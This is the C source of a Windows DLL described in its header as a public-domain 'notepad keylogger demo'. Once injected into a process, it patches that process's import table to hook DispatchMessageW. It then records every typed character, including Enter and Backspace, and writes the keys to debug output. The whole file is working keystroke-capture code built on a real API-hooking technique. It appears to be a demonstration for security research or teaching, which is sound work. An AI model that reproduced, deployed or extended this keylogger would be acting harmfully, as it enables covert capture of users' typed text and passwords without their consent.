/*
	notepad keylogger demo
	Source code put in public domain by Didier Stevens, no Copyright
	https://DidierStevens.com
	Use at your own risk

	Shortcomings, or todo's ;-)
	
	History:
	2008/06/30: start
*/

#define _UNICODE 1

#include <windows.h>
#include <stdio.h>
#include <tchar.h>

#include "iat.h"
#include "psutils.h"

#define MAX_STRING 256

BOOL g_bHookInstalled = FALSE;

LRESULT WINAPI (*OriginalDispatchMessageW)(const MSG *lpmsg);
    
LRESULT WINAPI HookDispatchMessageW(const MSG *lpmsg)
{
	char szBuffer[MAX_STRING];
	
	if (lpmsg->message == WM_CHAR)
	{
		if (isprint(lpmsg->wParam))
			snprintf(szBuffer, MAX_STRING, "%c", (char)lpmsg->wParam);
		else if (0x0000000d == lpmsg->wParam)
			strcpy(szBuffer, "<ENTER>");
		else if (0x00000008 == lpmsg->wParam)
			strcpy(szBuffer, "<BACKSPACE>");
		else
			snprintf(szBuffer, MAX_STRING, "%08X %08X %08X", lpmsg->message, lpmsg->wParam, lpmsg->lParam);
		OutputDebugStringA(szBuffer);
	}
	return (*OriginalDispatchMessageW)(lpmsg);
}

#ifdef __BORLANDC__
#pragma warn -8057
#endif

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	switch(fdwReason) 
	{ 
	  case DLL_PROCESS_ATTACH:
	  	if (FALSE == g_bHookInstalled)
	  	{
		  	OutputDebugString(_TEXT("Hook Hello DLL_PROCESS_ATTACH"));
		  	if (S_OK == PatchIAT(GetProcessImageModule(GetCurrentProcessId()), "user32.dll", "DispatchMessageW", (PVOID) HookDispatchMessageW, (PVOID *) &OriginalDispatchMessageW))
					g_bHookInstalled = TRUE;
				else
		  		OutputDebugString(_TEXT("Hooking failed."));
			}
      break;
	
	  case DLL_THREAD_ATTACH:
      break;
	
	  case DLL_THREAD_DETACH:
      break;
	
	  case DLL_PROCESS_DETACH:
	  	if (TRUE == g_bHookInstalled)
	  	{
		  	OutputDebugString(_TEXT("Unhook Hello DLL_PROCESS_DETACH"));
		  	if (S_OK == PatchIAT(GetProcessImageModule(GetCurrentProcessId()), "user32.dll", "DispatchMessageW", (PVOID) OriginalDispatchMessageW, NULL))
					g_bHookInstalled = FALSE;
				else
		  		OutputDebugString(_TEXT("Unhooking failed."));
			}
      break;
	}
	
	return TRUE;
}

#ifdef __BORLANDC__
#pragma warn +8057
#endif
